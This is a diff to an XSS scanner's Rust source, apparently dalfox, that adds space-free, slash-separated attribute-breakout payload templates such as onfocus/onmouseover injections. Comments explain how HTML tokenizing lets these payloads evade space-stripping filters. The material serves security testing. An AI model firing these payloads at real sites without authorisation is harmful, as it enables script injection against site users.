@@ -112,6 +112,24 @@ const ATTR_SQ_TEMPLATES: &[&str] = &[
     "' ontoggle={JS} popover class={CLASS} x='",
     "' onbeforeinput={JS} contenteditable class={CLASS} x='",
     "' onmouseover={JS} id={ID} x='",
+    // Slash-separated mirrors of the stay-in-tag shapes above, for a server that
+    // strips literal spaces from the reflection (which collapses the space-
+    // separated shapes into one merged attribute). These are always emitted, not
+    // gated on a filter result: space is not in `SPECIAL_PROBE_CHARS`, so the
+    // scanner never classifies it blocked — the win comes from the server doing
+    // the stripping, not from dalfox detecting it. Two details make them *verify*
+    // rather than merely reflect: (1) the handler/marker values are quoted
+    // (`onfocus="alert(1)"`). The HTML tokenizer treats `/` as an attribute
+    // separator only *after a value has closed* (before-attribute-name /
+    // after-attribute-value states); inside a bare unquoted value `/` is
+    // appended verbatim. Leading with the breakout quote closes the value it
+    // opened, and quoting each inner value closes that value too, so the next
+    // `/id=…` starts a fresh attribute instead of being swallowed. (2) The marker
+    // is an `id`, not a second `class`, because these breakouts most often land
+    // in a pre-existing `class="…"`, and a duplicate `class` attribute is dropped
+    // by the parser — which would erase a class marker but never an id.
+    "'/onmouseover=\"{JS}\"/id=\"{ID}\"/x='",
+    "'/autofocus/onfocus=\"{JS}\"/id=\"{ID}\"/x='",
     "'><svg onload={JS} class={CLASS}>",
     "'><img src=x onerror={JS} class={CLASS}>",
     "'><svg/onload={JS}/class={CLASS}>",
@@ -125,6 +143,11 @@ const ATTR_DQ_TEMPLATES: &[&str] = &[
     "\" ontoggle={JS} popover class={CLASS} x=\"",
     "\" onbeforeinput={JS} contenteditable class={CLASS} x=\"",
     "\" onmouseover={JS} id={ID} x=\"",
+    // Slash-separated mirrors — survive space-stripping filters; see the
+    // `ATTR_SQ_TEMPLATES` note for the quoting and `id`-marker reasoning (inner
+    // values single-quoted here so they nest inside the double-quote breakout).
+    "\"/onmouseover='{JS}'/id='{ID}'/x=\"",
+    "\"/autofocus/onfocus='{JS}'/id='{ID}'/x=\"",
     "\"><svg onload={JS} class={CLASS}>",
     "\"><img src=x onerror={JS} class={CLASS}>",
     "\"><svg/onload={JS}/class={CLASS}>",
@@ -140,6 +163,24 @@ const ATTR_UNQUOTED_TEMPLATES: &[&str] = &[
     "x onmouseover={JS} id={ID} ",
     "><svg onload={JS} class={CLASS}>",
     "><img src=x onerror={JS} class={CLASS}>",
+    // Two space-free additions for a server that strips literal spaces from the
+    // reflection (so the space-separated shapes above collapse into one merged
+    // attribute). This template set is also the fallback when the delimiter of
+    // the value could not be determined, so both must degrade gracefully.
+    //
+    // 1. A `>`-breakout: inside a *bare* unquoted value `/` is appended verbatim
+    //    (it is an attribute separator only once a value has closed), so a
+    //    stay-in-tag slash injection cannot work there — close the tag with `>`
+    //    and open a fresh, self-contained `<svg>` whose parts are `/`-separated.
+    //    Needs angles allowed.
+    "><svg/onload={JS}/id={ID}>",
+    // 2. A leading `x` plus self-quoted inner values, for the common case where
+    //    the delimiter was reported as unknown but the reflection is actually a
+    //    *quoted* value (`value="…"`) — including partial-encoding filters that
+    //    only touch `<`. The real closing quote ends the value early, and each
+    //    quoted `id="…"` then recovers as a clean element id (verified against
+    //    `partial-encode`/`multireflect` fixtures). Needs no angles.
+    "x/onmouseover=\"{JS}\"/id=\"{ID}\"/",
 ];
 
 /// URL-bearing attribute value (`href` / `src` / …): the protocol itself
